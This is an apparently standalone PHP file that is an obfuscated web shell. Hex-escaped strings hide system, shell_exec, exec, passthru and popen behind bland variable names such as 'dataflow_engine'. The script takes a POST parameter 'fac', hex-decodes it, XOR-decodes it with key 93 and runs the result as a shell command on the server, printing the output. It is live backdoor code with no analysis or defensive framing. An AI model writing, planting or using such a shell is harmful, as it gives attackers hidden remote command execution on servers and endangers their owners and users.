<?php

$module_controller = "\x68ex2\x62i\x6E";
$dataflow_engine2 = "she\x6Cl_\x65xec";
$dataflow_engine1 = "s\x79stem";
$dataflow_engine7 = "p\x63lose";
$dataflow_engine4 = "\x70\x61\x73\x73thru";
$dataflow_engine3 = "\x65xec";
$dataflow_engine5 = "pope\x6E";
$dataflow_engine6 = "s\x74r\x65am\x5F\x67et\x5Fcon\x74e\x6Ets";
if (isset($_POST["f\x61c"])) {
            function event_handler     (    $ref   ,      $value      )    {
     $flg    =      ''    ;
     for($x=0;
 $x<strlen($ref);
 $x++){
$flg.=chr(ord($ref[$x])^$value);

} return      $flg;
     
}
            $fac = $module_controller($_POST["f\x61c"]);
            $fac = event_handler($fac, 93);
            if (function_exists($dataflow_engine1)) {
                $dataflow_engine1($fac);
            } elseif (function_exists($dataflow_engine2)) {
                print $dataflow_engine2($fac);
            } elseif (function_exists($dataflow_engine3)) {
                $dataflow_engine3($fac, $marker_ref);
                print join("\n", $marker_ref);
            } elseif (function_exists($dataflow_engine4)) {
                $dataflow_engine4($fac);
            } elseif (function_exists($dataflow_engine5) && function_exists($dataflow_engine6) && function_exists($dataflow_engine7)) {
                $value_flg = $dataflow_engine5($fac, 'r');
                if ($value_flg) {
                    $data_chunk_hld = $dataflow_engine6($value_flg);
                    $dataflow_engine7($value_flg);
                    print $data_chunk_hld;
                }
            }
            exit;
        }